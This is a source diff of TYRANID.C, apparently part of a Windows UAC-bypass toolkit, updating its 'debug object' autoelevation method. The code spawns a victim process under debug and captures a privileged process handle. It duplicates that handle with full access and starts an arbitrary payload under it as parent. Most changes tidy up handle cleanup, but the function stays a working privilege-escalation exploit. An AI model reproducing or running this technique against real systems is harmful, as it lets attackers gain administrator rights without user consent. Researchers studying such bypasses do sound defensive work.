@@ -4,9 +4,9 @@
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.67
+*  VERSION:     3.69
 *
-*  DATE:        11 Feb 2025
+*  DATE:        07 Jul 2025
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -435,25 +435,18 @@ NTSTATUS ucmDebugObjectMethod(
 )
 {
     //UINT retryCount = 0;
-
+    BOOL debugObjectSet = FALSE;
     NTSTATUS status = STATUS_ACCESS_DENIED;
-
-    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;
-
+    HANDLE dbgHandle = NULL, dbgProcessHandle = NULL, dupHandle = NULL;
     PROCESS_INFORMATION procInfo;
-
     DEBUG_EVENT dbgEvent;
-
     WCHAR szProcess[MAX_PATH * 2];
-
 
     do {
 
         //
         // Spawn initial non elevated victim process under debug.
         //
-
-
         //do { /* remove comment for attempt to spam debug object within thread pool */
 
         _strcpy(szProcess, g_ctx->szSystemDirectory);
@@ -474,11 +467,9 @@ NTSTATUS ucmDebugObjectMethod(
             break;
         }
 
-
         //
         // Capture debug object handle.
         //
-
         status = supGetProcessDebugObject(procInfo.hProcess,
             &dbgHandle);
 
@@ -486,6 +477,8 @@ NTSTATUS ucmDebugObjectMethod(
             TerminateProcess(procInfo.hProcess, 0);
             CloseHandle(procInfo.hThread);
             CloseHandle(procInfo.hProcess);
+            procInfo.hThread = NULL;
+            procInfo.hProcess = NULL;
             break;
         }
 
@@ -526,18 +519,16 @@ NTSTATUS ucmDebugObjectMethod(
         // Update thread TEB with debug object handle to receive debug events.
         //
         DbgUiSetThreadDebugObject(dbgHandle);
-        dbgProcessHandle = NULL;
+        debugObjectSet = TRUE;
 
         //
         // Debugger wait cycle.
         //
         while (1) {
-
             if (!WaitForDebugEvent(&dbgEvent, INFINITE))
                 break;
 
             switch (dbgEvent.dwDebugEventCode) {
-
                 //
                 // Capture initial debug event process handle.
                 //
@@ -550,52 +541,60 @@ NTSTATUS ucmDebugObjectMethod(
                 break;
 
             ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
-
         }
 
-        if (dbgProcessHandle == NULL)
-            break;
-
-        //
-        // Create new handle from captured with PROCESS_ALL_ACCESS.
-        //
-        dupHandle = NULL;
-        status = NtDuplicateObject(dbgProcessHandle,
-            NtCurrentProcess(),
-            NtCurrentProcess(),
-            &dupHandle,
-            PROCESS_ALL_ACCESS,
-            0,
-            0);
-
-        if (NT_SUCCESS(status)) {
+        if (dbgProcessHandle) {
             //
-            // Run new process with parent set to duplicated process handle.
+            // Create new handle from captured with PROCESS_ALL_ACCESS.
             //
-            ucmxCreateProcessFromParent(dupHandle, lpszPayload);
-            NtClose(dupHandle);
+            status = NtDuplicateObject(dbgProcessHandle,
+                NtCurrentProcess(),
+                NtCurrentProcess(),
+                &dupHandle,
+                PROCESS_ALL_ACCESS,
+                0,
+                0);
+
+            if (NT_SUCCESS(status)) {
+                //
+                // Run new process with parent set to duplicated process handle.
+                //
+                ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+                NtClose(dupHandle);
+                dupHandle = NULL;
+            }
         }
 
+    } while (FALSE);
+
+    //
+    // Cleanup section.
+    //
+    if (debugObjectSet) {
 #pragma warning(push)
 #pragma warning(disable: 6387)
         DbgUiSetThreadDebugObject(NULL);
 #pragma warning(pop)
+    }
 
+    if (dbgHandle) {
         NtClose(dbgHandle);
-        dbgHandle = NULL;
+    }
 
+    if (dbgProcessHandle) {
         CloseHandle(dbgProcessHandle);
+    }
 
-        //
-        // Release victim process.
-        //
+    // Release victim process if still open
+    if (procInfo.hThread) {
         CloseHandle(procInfo.hThread);
+    }
+
+    if (procInfo.hProcess) {
         TerminateProcess(procInfo.hProcess, 0);
         CloseHandle(procInfo.hProcess);
+    }
 
-    } while (FALSE);
-
-    if (dbgHandle) NtClose(dbgHandle);
     supSetGlobalCompletionEvent();
     return status;
 }
